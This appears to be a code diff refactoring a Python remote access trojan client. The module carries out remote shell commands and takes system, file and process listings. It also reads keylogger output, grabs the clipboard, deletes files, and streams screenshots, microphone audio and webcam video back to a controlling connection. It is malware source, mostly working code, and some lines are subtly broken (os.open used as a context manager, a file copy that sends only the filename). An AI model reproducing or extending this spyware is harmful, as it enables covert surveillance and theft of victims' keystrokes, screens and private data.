@@ -1,16 +1,14 @@
 import os
 import struct
 import pickle
-import wave
 import pyperclip
 import pyautogui
 import pyaudio
 import cv2
 import subprocess
 import numpy as np
-import mss
-from .connection_module import (send_file, read_string_from_connection, 
-                               send_string_into_connection, send_image)
+import tempfile
+from .connection_module import SecureConnectionClient
 
 
 def gather_system_info(connection, operation_system):
@@ -18,85 +16,92 @@ def gather_system_info(connection, operation_system):
         cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
         process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         stdout, stderr = process.communicate()
-        send_string_into_connection(connection, stdout + stderr)
+        connection.send_data(stdout + stderr)
     except Exception as e:
         print(f"Error gathering system info: {e}")
 
 def command_line_interface(connection):
-    cmd = read_string_from_connection(connection)
+    cmd = connection.receive_data()
     process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     stdout, stderr = process.communicate()
-    send_string_into_connection(connection, stdout + stderr)
+    connection.send_data(stdout + stderr)
 
 def file_directory_discovery(connection, operation_system):
     cmd = "dir" if operation_system == "Windows" else "ls -l"
     process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     stdout, stderr = process.communicate()
-    send_string_into_connection(connection, stdout + stderr)
+    connection.send_data(stdout + stderr)
 
 def remote_file_copy(connection):  
-    filename = read_string_from_connection(connection)
-    send_file(connection, filename)
+    filename = connection.receive_data()
+    connection.send_data(filename)
 
 def file_deletion(connection):
-    filename = read_string_from_connection(connection)
+    filename = connection.receive_data()
     os.remove(filename)
 
 def process_discovery(connection, operation_system):
     cmd = "tasklist" if operation_system == "Windows" else "ps aux"
     process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     stdout, stderr = process.communicate()
-    send_string_into_connection(connection, stdout + stderr)
+    connection.send_data(stdout + stderr)
 
 def input_capture(connection):
-    send_file(connection, "keys.txt")
+    if os.path.exists("keys.txt"):
+        with os.open("keys.txt") as file:
+            file_size = os.path.getsize("keys.txt")
+            bytes = os.read(file, file_size)
+            connection.send_data(bytes)
 
 def clipboard_data(connection):
     clboard = pyperclip.paste()
-    send_string_into_connection(connection, clboard)
+    clboard_bytes = clboard.encode("utf-8")
+    connection.send_data(clboard_bytes)
 
 def screenshot_capture(connection):
-    pyautogui.screenshot("screenshot.png")
-    send_file(connection, "screenshot.png")
-    os.remove("screenshot.png")
+    tempfile.gettempdir()
+    screenshot_path = tempfile.gettempdir() + "/screenshot.png"
+    pyautogui.screenshot(screenshot_path)
+    if os.path.exists(screenshot_path):
+        with os.open(screenshot_path) as file:
+            file_size = os.path.getsize(screenshot_path)
+            bytes = os.read(file, file_size)
+            connection.send_data(bytes)
+            os.remove(screenshot_path)
 
 def audio_capture(connection):
     try:
-        seconds = read_string_from_connection(connection)
-        seconds = int(seconds)
         CHUNK = 1024
         FORMAT = pyaudio.paInt16
         CHANNELS = 2
         RATE = 44100
-        RECORD_SECONDS = seconds
-        WAVE_OUTPUT_FILENAME = "output.wav"
 
         with pyaudio.PyAudio() as p:
             stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-            frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS))]
-            stream.stop_stream()
-            stream.close()
 
-        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
-            wf.setnchannels(CHANNELS)
-            wf.setsampwidth(p.get_sample_size(FORMAT))
-            wf.setframerate(RATE)
-            wf.writeframes(b''.join(frames))
+            while True:
+                bytes = connection.receive_data()
+                if bytes.decode("utf-8") == "Stop":
+                    break
+                audio_data = stream.read(CHUNK)
+                connection.send_data(audio_data)
 
-        send_file(connection, "output.wav")
     except Exception as e:
         print(f"Error in audio capture: {e}")
+    finally:
+        stream.stop_stream()
+        stream.close()
 
 
 def video_capture(connection):
     cap = cv2.VideoCapture(0)
     while True:
-        do = connection.recv(10)
+        do = connection.receive_data()
         if do == b"continue":
             ret, frame = cap.read()
             data = pickle.dumps(frame)
             message_size = struct.pack("L", len(data))
-            connection.sendall(message_size + data)
+            connection.send_data(message_size + data)
         elif do == b"stop":
             break
     cap.release()
@@ -104,12 +109,21 @@ def video_capture(connection):
 def screen_capture(connection):
     print("Capturing...")
     capturing = True
-    while capturing: 
+    while capturing:
         screenshot = pyautogui.screenshot()
         screenshot_np = np.array(screenshot)
-        screenshot_np = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
+        screenshot_np = cv2.resize(screenshot_np, (1280, 720))
+        screenshot_np = cv2.cvtColor(screenshot_np, cv2.COLOR_BGR2GRAY)
+
+        # Compress image data
+        _, img_encoded = cv2.imencode('.jpg', screenshot_np, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
+        img_data = img_encoded.tobytes()
+
         try:
-            send_image(connection, screenshot_np)
+            connection.send_data(img_data)
         except Exception as e:
             print(f"Error sending image {e}")
-        print(f"Sent image {screenshot_np}")
+            raise e
+        signal = connection.receive_data()
+        if signal == b"STOP":
+            capturing = False
